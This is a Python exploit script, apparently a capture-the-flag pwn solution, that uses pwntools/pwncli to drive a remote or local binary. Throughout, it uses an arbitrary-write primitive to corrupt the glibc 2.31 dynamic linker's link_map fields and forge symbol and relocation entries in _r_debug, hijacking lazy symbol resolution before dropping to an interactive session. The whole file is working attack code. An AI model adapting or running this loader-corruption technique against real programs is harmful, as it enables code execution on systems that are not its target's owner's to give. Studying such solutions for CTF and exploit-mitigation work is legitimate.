#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *
import struct

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc
ld = ELF("./ld-2.31.so", checksec=False)


def write(offset, bytes, tag=0):
    for i, byte in enumerate(bytes):
        s(p64(offset + i, signed=True))
        s(p8(byte))
        if tag == 0:
            ru(b"HELLO")


class link_map:
    DT_JMPREL = 23
    DT_SYMTAB = 6
    DT_STRTAB = 5
    DT_VER = 50
    DT_FINI = 13
    DT_PLTGOT = 3
    DT_FINI_ARRAY = 26
    DT_FINI_ARRAYSZ = 28

    def __init__(self, offset):
        self.offset = offset

    def l_addr(self):
        return ld.address + self.offset

    def l_info(self, tag):
        return ld.address + self.offset + 0x40 + tag * 8

    def l_init_called(self):
        return self.l_addr() + 0x31C


ld.address = 0x235000 - 0x10
libc.address = 0x41000 - 0x10
binary_map = link_map(0x2F190)
ld_map = link_map(0x2E9E8)
lg("binary_map.l_addr", binary_map.l_addr())

l_addr_offset = elf.got["_Exit"] - elf.got["write"]
write(binary_map.l_addr(), p8(l_addr_offset))


write(ld.symbols["_r_debug"], flat([0x4100, 0x200000007, 0]))
# set reloc table to _r_debug
write(binary_map.l_info(link_map.DT_JMPREL), p8(0xB8))
set_sym_table(elf64_sym.pack(0, 0x12, 0, 0, 0x1270 - l_addr_offset, 0))
write(binary_map.l_info(link_map.DT_VER), p64(0))
restore_sym_table()
restore_rela_table()

debugB()
write(binary_map.l_init_called(), p8(0))
write(
    0x263000 + elf64_sym.size * 8 - 0x10,
    elf64_sym.pack(0x166, 0x12, 0x0, 0xD, 0x11D60, 0xC),
)
write(ld_map.l_info(link_map.DT_SYMTAB), p8(0xD8))
write(0x264160 - 0x10 + 0x3E, b"_dl_deallocateajds\x00")  # r_debug+0x3e
write(binary_map.l_info(link_map.DT_STRTAB), p8(0xB8))
set_rela_table(elf64_rela.pack(elf.got["write"] - l_addr_offset, 0x200000007, 0))
restore_rela_table()


# _IO_2_1_stdout_
# write(0x22E6A0 - 0x10, flat([0xFBAD1887, 0, 0, 0]) + p8(0))  # _flags
# write(0x26A160 - 0x10 + 0x3E, b"_IO_flush_all\x00")  # r_debug+0x3e
# write(0x26A1F8 - 0x10, p8(0xB8), tag=False)
# write(0x26A1F8 - 0x10, b"\x78")

# ld - pltgot - 0x269000 (DT_PLTGOT on 0x7ffff7ffced8)
# strtab - 0x269a50 (0x7ffff7ffce98)

ia()
